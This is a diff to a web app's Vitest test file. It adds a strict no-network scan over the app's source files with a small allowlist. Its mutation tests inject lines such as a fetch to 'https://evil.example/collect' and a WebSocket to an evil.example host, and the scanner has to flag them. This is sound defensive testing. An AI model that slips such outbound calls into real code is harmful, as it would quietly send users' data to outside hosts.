@@ -1,8 +1,11 @@
 /// <reference types="vite/client" />
 import { createElement } from 'react';
 import { renderToStaticMarkup } from 'react-dom/server';
+import { readdirSync, statSync } from 'node:fs';
+import { join } from 'node:path';
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import { WARDROBES } from '../../../../packages/rules/src/fixtures/wardrobes';
+import { ALLOWED, networkOffences } from '../../test-support/network-scan';
 import { EventLog } from '../../lib/events';
 import type { StoredItem } from '../../lib/repository';
 import { applySwap, buildCtx, startView, swapOptions } from '../../lib/suggestions-view-model';
@@ -11,12 +14,13 @@ import { OutfitCard } from './OutfitCard';
 import { OutfitsView } from './OutfitsView';
 import { SwapSheet } from './SwapSheet';
 
-// WO-0050 and WO-0051: the sign-in, session and consent modules talk to the Supabase Auth service by design and are not on the suggestion path. They are
+// IMPORT RULE (the test 'imports only React...' below): WO-0050 and WO-0051: the sign-in, session and consent modules talk to the Supabase Auth service by design and are not on the suggestion path. They are
 // named one by one (never a folder), so a new module under lib/ is still scanned, and lib/supabase/source.test.ts proves that no
 // file scanned here imports any of them. WO-0052: the repository modules (repository, mapping, errors) ARE scanned, with the same strict
 // rules (they reach the service only through a client handed to them, so they hold no fetch and no URL). Exactly one module besides the
 // sign-in ones is left out by name: lib/supabase/backend.ts, which makes the session client and reads the sign-in state to choose the
-// repository; source.test.ts pins its imports.
+// repository; source.test.ts pins its imports. The NETWORK rule is NOT limited to this list: the last describe of this file runs it on every file
+// of lib, components and app (WO-0053).
 const sources = import.meta.glob<string>(
   [
     './*.tsx', '../../app/outfits/**/*.tsx', '../../lib/**/*.ts', '!../../lib/**/*.test.ts', '../use-repository.ts', '../use-learned.ts',
@@ -199,5 +203,69 @@ describe('outfits screen: keyboard (CC6)', () => {
     const sheet = sources['./SwapSheet.tsx']!;
     expect(sheet).toContain('heading.current?.focus()');
     expect(sheet).toMatch(/e\.key === 'Escape'\) onClose\(\)/);
+  });
+});
+
+// WO-0053 (M1): the no-network rule on EVERY non-test file of lib, components and app, plus proxy.ts and next.config.ts. The only things it lets
+// through are listed in test-support/network-scan.ts: the two learned-file fetches and the placeholder host that is only parsed against.
+const everything = import.meta.glob<string>(
+  ['../../lib/**/*.{ts,tsx}', '../../components/**/*.{ts,tsx}', '../../app/**/*.{ts,tsx}', '../../proxy.ts', '../../next.config.ts', '!../../**/*.test.ts'],
+  { query: '?raw', import: 'default', eager: true },
+);
+const webRoot = new URL('../..', import.meta.url).pathname;
+const rel = (f: string) => new URL(f, import.meta.url).pathname.slice(webRoot.length); // vite shortens the keys, so resolve them
+const everyFile = Object.entries(everything).map(([f, text]) => [rel(f), text] as const);
+const SKIP = ['node_modules', '.next'];
+const onDisk = (dir: string): string[] => readdirSync(dir).flatMap((n) => {
+  const full = join(dir, n);
+  return SKIP.includes(n) ? [] : statSync(full).isDirectory() ? onDisk(full) : /\.tsx?$/.test(n) && !n.endsWith('.test.ts') ? [full] : [];
+});
+
+describe('the strict no-network scan runs on every file, with exactly the listed allowances (WO-0053 M1)', () => {
+  it('scans every non-test source file of lib, components and app that is on disk, including each Supabase client module', () => {
+    const disk = ['lib', 'components', 'app'].flatMap((d) => onDisk(join(webRoot, d))).map((f) => f.slice(webRoot.length)).sort();
+    expect(everyFile.map(([f]) => f).filter((f) => /^(lib|components|app)\//.test(f)).sort()).toEqual(disk);
+    expect(disk.length).toBeGreaterThan(50);
+    for (const f of ['lib/supabase/backend.ts', 'lib/supabase/gate-state.ts', 'lib/supabase/browser.ts', 'lib/supabase/repository.ts', 'lib/supabase/mapping.ts', 'lib/supabase/server.ts',
+      'lib/supabase/proxy-session.ts', 'lib/supabase/auth-actions.ts', 'lib/supabase/consent-actions.ts', 'lib/auth-form.ts', 'lib/supabase/gate.ts', 'components/auth/AuthForm.tsx', 'proxy.ts']) expect(everyFile.map(([n]) => n), f).toContain(f);
+  });
+  it('no file holds a request call or a URL, except the listed allowances', () => {
+    for (const [file, text] of everyFile) expect(networkOffences(file, text), file).toEqual([]);
+  });
+  it('each allowance is present exactly once in its file (so a second copy is caught)', () => {
+    for (const [file, parts] of Object.entries(ALLOWED)) {
+      const text = everyFile.find(([f]) => f === file)?.[1] ?? '';
+      for (const part of parts) expect(text.split(part).length - 1, `${file}: ${part}`).toBe(1);
+    }
+  });
+  it('the allowances are only the two learned-file fetches and the placeholder host in two named files', () => {
+    expect(ALLOWED).toEqual({
+      'lib/engine-config.ts': ['fetch(PRIOR_URL, init())', 'fetch(UNLOCK_URL, init())'],
+      'lib/auth-form.ts': ['http://sparta.invalid'], 'lib/supabase/gate.ts': ['http://sparta.invalid'],
+    });
+  });
+  const MUTANTS: [string, (t: string) => string][] = [
+    ['a fetch to another host', (t) => `${t}\nvoid fetch('https://evil.example/collect');`],
+    ['an XMLHttpRequest', (t) => `${t}\nnew XMLHttpRequest();`],
+    ['a beacon', (t) => `${t}\nnavigator.sendBeacon('/x');`],
+    ['a web socket', (t) => `${t}\nnew WebSocket('wss://evil.example');`],
+    ['a bare URL', (t) => `${t}\nconst u = 'http://evil.example';`],
+  ];
+  it.each(['lib/supabase/backend.ts', 'lib/supabase/gate-state.ts', 'lib/supabase/browser.ts', 'lib/supabase/repository.ts', 'lib/supabase/mapping.ts'])('a request added to %s fails the scan', (file) => {
+    const text = everyFile.find(([f]) => f === file)![1];
+    expect(networkOffences(file, text)).toEqual([]);
+    for (const [name, mutate] of MUTANTS) expect(networkOffences(file, mutate(text)), `${file}: ${name}`).not.toEqual([]);
+  });
+  it('a request added to ANY scanned file fails the scan', () => {
+    for (const [file, text] of everyFile) expect(networkOffences(file, `${text}\nvoid fetch('https://evil.example/x');`), file).not.toEqual([]);
+  });
+  it('the allowances are narrow: a third fetch in engine-config, a second placeholder literal and another host in auth-form all fail', () => {
+    const get = (f: string) => everyFile.find(([n]) => n === f)![1];
+    expect(networkOffences('lib/engine-config.ts', `${get('lib/engine-config.ts')}\nvoid fetch(PRIOR_URL, init());`)).not.toEqual([]);
+    expect(networkOffences('lib/engine-config.ts', get('lib/engine-config.ts').replace('fetch(UNLOCK_URL, init())', 'fetch(OTHER_URL, init())'))).not.toEqual([]);
+    expect(networkOffences('lib/auth-form.ts', `${get('lib/auth-form.ts')}\nconst b = 'http://sparta.invalid';`)).not.toEqual([]);
+    expect(networkOffences('lib/auth-form.ts', get('lib/auth-form.ts').replace('http://sparta.invalid', 'http://evil.example'))).not.toEqual([]);
+    expect(networkOffences('lib/supabase/gate.ts', get('lib/supabase/gate.ts').replace('http://sparta.invalid', 'https://evil.example'))).not.toEqual([]);
+    expect(networkOffences('lib/supabase/backend.ts', `${get('lib/supabase/backend.ts')}\nconst b = 'http://sparta.invalid';`)).not.toEqual([]); // the placeholder is not allowed elsewhere
   });
 });
